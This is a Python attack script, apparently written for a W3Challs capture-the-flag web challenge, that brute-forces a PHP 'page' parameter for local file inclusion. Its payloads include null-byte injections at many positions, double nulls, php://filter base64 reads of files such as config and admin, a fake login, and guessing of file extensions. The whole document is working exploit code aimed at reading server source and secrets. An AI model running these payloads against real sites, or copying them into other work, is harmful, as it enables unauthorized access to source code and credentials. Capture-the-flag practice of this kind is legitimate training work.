#!/usr/bin/env python3
import requests
from bs4 import BeautifulSoup

s = requests.Session()
base = "https://vip.hax.w3challs.com/"

print("[*] ADVANCED NULL BYTE ANALYSIS...")

# Si los archivos existen pero muestran contenido vacío,
# tal vez necesito null byte ANTES del nombre del archivo
# o en una posición específica

null_positions = [
    "%00login",  # Null antes
    "lo%00gin",  # Null en medio
    "login%00",  # Null después (ya probado)
    "%00/login",  # Null con slash
    ".%00/login",  # Dot null slash
    "/%00login",  # Slash null
    "\x00login",  # Raw null
    "login\x00.php",  # Null antes de extensión
    "login.%00php",  # Null en extensión
]

interesting_files = ["login", "member", "admin", "flag", "config", "auth"]

for file in interesting_files:
    for pattern in null_positions:
        payload = pattern.replace("login", file)
        r = s.get(f"{base}index.php?page={payload}")
        
        if len(r.text) != 736 and len(r.text) != 1796:  # Different from empty response
            print(f"[!] DIFFERENT SIZE with {payload}: {len(r.text)} bytes")
            
            soup = BeautifulSoup(r.text, 'html.parser')
            corps = soup.find('div', {'id': 'corps'})
            if corps:
                content = corps.get_text(strip=True)
                if content and 'Welcome to' not in content:
                    print(f"    Content: {content[:200]}")
                    
                    if 'flag' in content.lower():
                        print(f"    [!!!] FLAG FOUND: {content}")

# Probar con doble null byte
print("\n[*] DOUBLE NULL BYTE TEST...")

double_null = [
    "%00%00",
    "%00\x00",
    "\x00\x00",
    "%2500%2500",
]

for file in interesting_files:
    for null in double_null:
        r = s.get(f"{base}index.php?page={file}{null}")
        if len(r.text) != 736:
            print(f"[!] Double null hit: {file}{null}")

# Intentar leer archivos con PHP filter + null byte
print("\n[*] PHP FILTER WITH NULL BYTE...")

for file in interesting_files:
    # Filter then null
    r = s.get(f"{base}index.php?page=php://filter/read=convert.base64-encode/resource={file}%00")
    if 'PD9waHA' in r.text:  # Base64 for '<?php'
        print(f"[!!!] BASE64 PHP CODE for {file}")
        
    # Null then filter  
    r = s.get(f"{base}index.php?page={file}%00&filter=convert.base64-encode")
    if 'PD9waHA' in r.text:
        print(f"[!!!] BASE64 with null first: {file}")

# Probar si el problema es que necesito autenticación primero
print("\n[*] NULL BYTE AFTER FAKE AUTH...")

# Intentar un login falso para crear sesión
s.post(f"{base}index.php?page=login", data={'login': 'test', 'pass': 'test'})

# Ahora probar con null bytes
for file in ["member", "admin", "flag"]:
    r = s.get(f"{base}index.php?page={file}%00")
    if len(r.text) != 736 and len(r.text) != 1796:
        print(f"[!] Different after fake login: {file}%00 = {len(r.text)} bytes")

# Verificar si hay algún patrón en los archivos vacíos
print("\n[*] ANALYZING EMPTY RESPONSES...")

r_empty = s.get(f"{base}index.php?page=nonexistent")
r_valid = s.get(f"{base}index.php?page=login")
r_nulled = s.get(f"{base}index.php?page=login%00")

print(f"Nonexistent page: {len(r_empty.text)} bytes")
print(f"Valid login page: {len(r_valid.text)} bytes")  
print(f"Login with null: {len(r_nulled.text)} bytes")

# Si login%00 muestra diferente contenido, extraerlo
if len(r_nulled.text) != len(r_valid.text):
    soup = BeautifulSoup(r_nulled.text, 'html.parser')
    corps = soup.find('div', {'id': 'corps'})
    if corps:
        # Buscar cualquier texto que no sea el default
        text = corps.get_text(strip=True)
        if text and 'Welcome to' not in text:
            print(f"[!] Login null content: {text}")

# IDEA: Tal vez los archivos PHP no se están incluyendo correctamente
# porque tienen una extensión diferente o están en otro directorio
print("\n[*] TESTING DIFFERENT EXTENSIONS WITH NULL...")

extensions = [".php", ".inc", ".php3", ".php4", ".php5", ".phtml", ".txt", ".html", ".bak"]

for file in ["member", "admin", "flag"]:
    for ext in extensions:
        # Con null byte para evitar que se agregue .php
        r = s.get(f"{base}index.php?page={file}{ext}%00")
        if len(r.text) != 736 and len(r.text) != 1796:
            print(f"[!!!] HIT: {file}{ext}%00 = {len(r.text)} bytes")
            
            soup = BeautifulSoup(r.text, 'html.parser')
            corps = soup.find('div', {'id': 'corps'})
            if corps:
                content = corps.get_text(strip=True)
                if 'flag' in content.lower():
                    print(f"[!!!] FLAG: {content}")